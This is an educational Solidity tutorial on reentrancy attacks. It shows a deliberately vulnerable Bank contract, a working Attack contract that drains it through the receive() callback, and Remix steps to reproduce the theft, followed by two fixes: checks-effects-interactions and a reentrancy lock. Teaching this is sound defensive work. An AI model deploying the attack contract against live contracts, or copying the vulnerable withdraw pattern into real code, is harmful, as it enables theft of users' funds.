---
title: S01. Reentrancy Attack
tags:
  - solidity
  - security
  - fallback
  - modifier
---

# WTF Solidity S01. Reentrancy Attack

Recently, I have been revisiting Solidity, consolidating the finer details, and writing "WTF Solidity" tutorials for newbies.

Twitter: [@0xAA_Science](https://twitter.com/0xAA_Science) | [@WTFAcademy\_](https://twitter.com/WTFAcademy_)

Community: [Discord](https://discord.gg/5akcruXrsk)｜[Wechat](https://docs.google.com/forms/d/e/1FAIpQLSe4KGT8Sh6sJ7hedQRuIYirOoZK_85miz3dw7vA1-YjodgJ-A/viewform?usp=sf_link)｜[Website wtf.academy](https://wtf.academy)

Codes and tutorials are open source on GitHub: [github.com/AmazingAng/WTF-Solidity](https://github.com/AmazingAng/WTF-Solidity)

English translations by: [@to_22X](https://twitter.com/to_22X)

---

In this lesson, we will introduce the most common type of smart contract attack - reentrancy attack, which has led to the Ethereum fork into ETH and ETC (Ethereum Classic), and discuss how to prevent it.

## Reentrancy Attack

Reentrancy attack is the most common type of attack in smart contracts, where attackers exploit contract vulnerabilities (such as the fallback function) to repeatedly call the contract, transferring or minting a large number of tokens.

Some notable reentrancy attack incidents include:

- In 2016, The DAO contract was subjected to a reentrancy attack, resulting in the theft of 3,600,000 ETH from the contract and the Ethereum fork into the ETH chain and ETC (Ethereum Classic) chain.
- In 2019, the synthetic asset platform Synthetix suffered a reentrancy attack, resulting in the theft of 3,700,000 sETH.
- In 2020, the lending platform Lendf.me suffered a reentrancy attack, resulting in a theft of $25,000,000.
- In 2021, the lending platform CREAM FINANCE suffered a reentrancy attack, resulting in a theft of $18,800,000.
- In 2022, the algorithmic stablecoin project Fei suffered a reentrancy attack, resulting in a theft of $80,000,000.

It has been 6 years since The DAO was subjected to a reentrancy attack, but there are still several projects each year that suffer multimillion-dollar losses due to reentrancy vulnerabilities. Therefore, understanding this vulnerability is crucial.

## The Story of `0xAA` Robbing the Bank

To help everyone better understand, let me tell you a story about how the hacker `0xAA` robbed the bank.

The bank on Ethereum is operated by robots controlled by smart contracts. When a regular user comes to the bank to withdraw money, the service process is as follows:

1. Check the user's `ETH` balance. If it is greater than 0, proceed to the next step.
2. Transfer the user's `ETH` balance from the bank to the user and ask if the user has received it.
3. Update the user's balance to `0`.

One day, the hacker `0xAA` came to the bank and had the following conversation with the robot teller:

- 0xAA: I want to withdraw `1 ETH`.
- Robot: Checking your balance: `1 ETH`. Transferring `1 ETH` to your account. Have you received the money?
- 0xAA: Wait, I want to withdraw `1 ETH`.
- Robot: Checking your balance: `1 ETH`. Transferring `1 ETH` to your account. Have you received the money?
- 0xAA: Wait, I want to withdraw `1 ETH`.
- Robot: Checking your balance: `1 ETH`. Transferring `1 ETH` to your account. Have you received the money?
- 0xAA: Wait, I want to withdraw `1 ETH`.
- ...

In the end, `0xAA` emptied the bank's assets through the vulnerability of reentrancy attack, and the bank collapsed.

![](./img/S01-1.png)

## Vulnerable Contract Example

### Bank Contract

The bank contract is very simple and includes `1` state variable `balanceOf` to record the Ethereum balance of all users. It also includes `3` functions:

- `deposit()`: Deposit function that allows users to deposit `ETH` into the bank contract and updates their balances.
- `withdraw()`: Withdraw function that transfers the caller's balance to them. The steps are the same as in the story above: check balance, transfer funds, update balance. **Note: This function has a reentrancy vulnerability!**
- `getBalance()`: Get the `ETH` balance in the bank contract.

```solidity
contract Bank {
    mapping (address => uint256) public balanceOf;    // Balance mapping

    // Deposit Ether and update balance
    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    // Withdraw all Ether from msg.sender
    function withdraw() external {
        uint256 balance = balanceOf[msg.sender]; // Get balance
        require(balance > 0, "Insufficient balance");
        // Transfer Ether !!! May trigger the fallback/receive function of a malicious contract, posing a reentrancy risk!
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Failed to send Ether");
        // Update balance
        balanceOf[msg.sender] = 0;
    }

    // Get the balance of the bank contract
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

### Attack Contract

One vulnerability point of reentrancy attack is the transfer of `ETH` in the contract: if the target address of the transfer is a contract, it will trigger the fallback function of the contract, potentially causing a loop. If you are not familiar with fallback functions, you can read [WTF Solidity: 19: Receive ETH](https://github.com/AmazingAng/WTF-Solidity/blob/main/Languages/en/19_Fallback_en/readme.md). The `Bank` contract has an `ETH` transfer in the `withdraw()` function:

```
(bool success, ) = msg.sender.call{value: balance}("");
```

If the hacker re-calls the `withdraw()` function of the `Bank` contract in the `fallback()` or `receive()` function of the attack contract, it will cause the same loop as in the story of `0xAA` robbing the bank. The `Bank` contract will continuously transfer funds to the attacker, eventually emptying the contract's ETH balance.

```solidity
receive() external payable {
    bank.withdraw();
}
```

Below, let's take a look at the attack contract. Its logic is very simple, which is to repeatedly call the `withdraw()` function of the `Bank` contract through the `receive()` fallback function. It has `1` state variable `bank` to record the address of the `Bank` contract. It includes `4` functions:

- Constructor: Initializes the `Bank` contract address.
- `receive()`: The fallback function triggered when receiving ETH, which calls the `withdraw()` function of the `Bank` contract again in a loop for withdrawal.
- `attack()`: The attack function that first deposits funds into the `Bank` contract using the `deposit()` function, then initiates the first withdrawal by calling `withdraw()`. After that, the `withdraw()` function of the `Bank` contract and the `receive()` function of the attack contract will be called in a loop, emptying the ETH balance of the `Bank` contract.
- `getBalance()`: Retrieves the ETH balance in the attack contract.

```solidity
contract Attack {
    Bank public bank; // Address of the Bank contract

    // Initialize the address of the Bank contract
    constructor(Bank _bank) {
        bank = _bank;
    }

    // Callback function used for reentrancy attack on the Bank contract, repeatedly calling the target's withdraw function
    receive() external payable {
        if (bank.getBalance() >= 1 ether) {
            bank.withdraw();
        }
    }

    // Attack function, msg.value should be set to 1 ether when calling
    function attack() external payable {
        require(msg.value == 1 ether, "Require 1 Ether to attack");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    // Get the balance of this contract
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

## Reproduce on `Remix`

1. Deploy the `Bank` contract and call the `deposit()` function to transfer `20 ETH`.
2. Switch to the attacker's wallet and deploy the `Attack` contract.
3. Call the `attack()` function of the `Attack` contract to launch the attack, and transfer `1 ETH` during the call.
4. Call the `getBalance()` function of the `Bank` contract and observe that the balance has been emptied.
5. Call the `getBalance()` function of the `Attack` contract and see that the balance is now `21 ETH`, indicating a successful reentrancy attack.

## How to Prevent

Currently, there are two main methods to prevent potential reentrancy attack vulnerabilities: checks-effect-interaction pattern and reentrant lock.

### Checks-Effect-Interaction Pattern

The "Check-Effects-Interactions" pattern emphasizes that when writing functions, you should first check if state variables meet the requirements, then immediately update the state variables (such as balances), and finally interact with other contracts. If we update the balance in the `withdraw()` function of the `Bank` contract before transferring `ETH`, we can fix the vulnerability.

```solidity
function withdraw() external {
    uint256 balance = balanceOf[msg.sender];
    require(balance > 0, "Insufficient balance");
    // Checks-Effects-Interactions pattern: Update balance before sending ETH
    // During a reentrancy attack, balanceOf[msg.sender] has already been updated to 0, so it will fail the above check.
    balanceOf[msg.sender] = 0;
    (bool success, ) = msg.sender.call{value: balance}("");
    require(success, "Failed to send Ether");
}
```

### Reentrant Lock

The reentrant lock is a modifier that prevents reentrancy attacks. It includes a state variable `_status` that is initially set to `0`. Functions decorated with the `nonReentrant` modifier will check if `_status` is `0` on the first call, then set `_status` to `1`. After the function call completes, `_status` is set back to `0`. This prevents reentrancy attacks by causing an error if the attacking contract attempts a second call before the first call completes. If you are not familiar with modifiers, you can read [WTF Solidity: 11. Modifier](https://github.com/AmazingAng/WTF-Solidity/blob/main/Languages/en/11_Modifier_en/readme.md).

```solidity
uint256 private _status; // Reentrant lock

// Reentrant lock
modifier nonReentrant() {
    // _status will be 0 on the first call to nonReentrant
    require(_status == 0, "ReentrancyGuard: reentrant call");
    // Any subsequent calls to nonReentrant will fail
    _status = 1;
    _;
    // Call completed, restore _status to 0
    _status = 0;
}
```

Just by using the `nonReentrant` reentrant lock modifier on the `withdraw()` function, we can prevent reentrancy attacks.

```solidity
// Protect the vulnerable function with a reentrant lock
function withdraw() external nonReentrant{
    uint256 balance = balanceOf[msg.sender];
    require(balance > 0, "Insufficient balance");

    (bool success, ) = msg.sender.call{value: balance}("");
    require(success, "Failed to send Ether");

    balanceOf[msg.sender] = 0;
}
```

## Summary

In this lesson, we introduced the most common attack in Ethereum - the reentrancy attack, and made a story of robbing a bank with `0xAA` to help understand it. Finally, we discussed two methods to prevent reentrancy attacks: the checks-effect-interaction pattern and the reentrant lock. In the example, the hacker exploited the fallback function to perform a reentrancy attack during `ETH` transfer in the target contract. In real-world scenarios, the `safeTransfer()` and `safeTransferFrom()` functions of `ERC721` and `ERC1155`, as well as the fallback function of `ERC777`, can also potentially trigger reentrancy attacks. For beginners, my suggestion is to use a reentrant lock to protect all `external` functions that can change the contract state. Although it may consume more `gas`, it can prevent greater losses.
